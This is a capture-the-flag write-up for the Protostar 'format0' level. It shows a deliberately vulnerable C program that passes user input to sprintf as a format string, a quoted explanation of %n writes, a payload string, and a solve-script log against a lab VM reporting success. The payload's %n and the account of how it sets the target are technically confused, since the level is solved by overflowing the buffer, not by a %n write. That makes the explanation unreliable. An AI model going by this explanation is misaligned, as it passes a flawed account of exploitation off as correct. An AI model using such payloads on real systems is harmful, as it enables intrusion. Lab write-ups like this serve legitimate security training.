# Format0 | Protostar

This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.
  
Hints:
- This level should be done in less than 10 bytes of input.
- “Exploiting format string vulnerabilities”  
  
Reference:  
- https://medium.com/swlh/binary-exploitation-format-string-vulnerabilities-70edd501c5be

## Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```
The program takes a single argument that is supplied as a format string to sprintf(). The target value will be immediately after the buffer space in memory.

## Solution
Of particular interest in the reference is the following:
  
*Overwriting memory at any location  
In printf(), %n is a special case format specifier. Instead of being replaced by a function argument, %n will cause the number of characters written so far to be stored into the corresponding function argument.. For example, the following code will store the integer 5 into the variable num_char.*
```c
int num_char;
printf(“11111%n”, &num_char);
```
*With dummy output characters and width-controlling format specifiers, the attacker can now write arbitrary integers to the location pointed to by the function argument.
The following is an example of a width-controlling format specifier, which will help attackers avoid extremely long exploit strings (And allow attackers to access arbitrary locations even if the buffer is not large enough for the number of padding characters needed).*
```c
int num_char;
printf(“%10d%n”, 0, &num_char); 
-> will print "          0", num_char is 10
```
Therefore, in order to write to the target, the following gets supplied as an argument `%64d%n\xef\xbe\xad\xde`.
This writes 64 bytes to the buffer, followed by the value into the target address.
```bash
kali@kali:~/Desktop/protostar$ python solve_format0.py
[+] Connecting to 192.168.34.136 on port 22: Done
[*] user@192.168.34.136:
    Distro    Unknown Unknown
    OS:       Unknown
    Arch:     Unknown
    Version:  0.0.0
    ASLR:     Disabled
    Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
[+] Opening new channel: ['/opt/protostar/bin/format0', '%64d%n\xef\xbe\xad\xde']: Done
[+] Receiving all data: Done (37B)
[*] Closed SSH channel with 192.168.34.136
you have hit the target correctly :)
```